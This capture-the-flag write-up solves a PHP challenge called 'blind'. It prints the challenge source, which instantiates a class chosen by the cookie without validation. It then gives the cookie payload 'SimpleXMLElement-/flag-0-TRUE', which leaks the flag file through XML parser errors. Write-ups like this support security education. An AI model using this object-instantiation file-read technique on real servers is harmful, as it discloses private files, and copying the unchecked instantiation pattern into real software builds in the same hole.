# blind
The challange was:   
![Challenge](https://i.imgur.com/SMDEc9x.png)

When you open the link it shows the php code of the page.  
```php
<?php  
	function __autoload($cls) {  
		include $cls;  
	}  
	  
	class Black {  
		public function __construct($string, $default, $keyword, $store) {  
			if ($string) ini_set("highlight.string", "#0d0d0d");  
			if ($default) ini_set("highlight.default", "#0d0d0d");  
			if ($keyword) ini_set("highlight.keyword", "#0d0d0d");  
			  
			if ($store) {  
				setcookie('theme', "Black-".$string."-".$default."-".$keyword, 0, '/');  
			}  
		}  
	}  
	  
	class Green {  
		public function __construct($string, $default, $keyword, $store) {  
			if ($string) ini_set("highlight.string", "#00fb00");  
			if ($default) ini_set("highlight.default", "#00fb00");  
			if ($keyword) ini_set("highlight.keyword", "#00fb00");  
			  
			if ($store) {  
				setcookie('theme', "Green-".$string."-".$default."-".$keyword, 0, '/');  
			}  
		}  
	}  
	  
	if ($_=@$_GET['theme']) {  
		if (in_array($_, ["Black", "Green"])) {  
			if (@class_exists($_)) {  
				($string = @$_GET['string']) || $string = false;  
				($default = @$_GET['default']) || $default = false;  
				($keyword = @$_GET['keyword']) || $keyword = false;  
	  
				new $_($string, $default, $keyword, @$_GET['store']);  
			}  
		}  
	} else if ($_=@$_COOKIE['theme']) {  
		$args = explode('-', $_);  
		if (class_exists($args[0])) {  
			new $args[0]($args[1], $args[2], $args[3], '');  
		}  
	} else if ($_=@$_GET['info']) {  
		phpinfo();  
	}  
	  
	highlight_file(__FILE__);
```
Going directly to the point, we'll use the cookie 'theme' to use a class to somehow echo out the flag for us.  
And we can use the php_info to see whats enable.  

Going through countless classes, looking for one that have at least 4 string args i fond the SimpleXMLElement.  
Changing the cookie to `SimpleXMLElement-/flag-0-TRUE` we get the flag out in the error message.  
```
**Warning**: SimpleXMLElement::__construct(): /flag:1: parser error : Start tag expected, '<' not found in **/var/www/html/index.php** on line **43**  
  
**Warning**: SimpleXMLElement::__construct(): 35c3_even_a_blind_squirrel_finds_a_nut_now_and_then in **/var/www/html/index.php** on line **43**  
  
**Warning**: SimpleXMLElement::__construct(): ^ in **/var/www/html/index.php** on line **43**  
  
**Fatal error**: Uncaught Exception: String could not be parsed as XML in /var/www/html/index.php:43 Stack trace: #0 /var/www/html/index.php(43): SimpleXMLElement->__construct('/flag', '0', 'TRUE', '') #1 {main} thrown in **/var/www/html/index.php** on line **43**
```

Flag is `35c3_even_a_blind_squirrel_finds_a_nut_now_and_then`  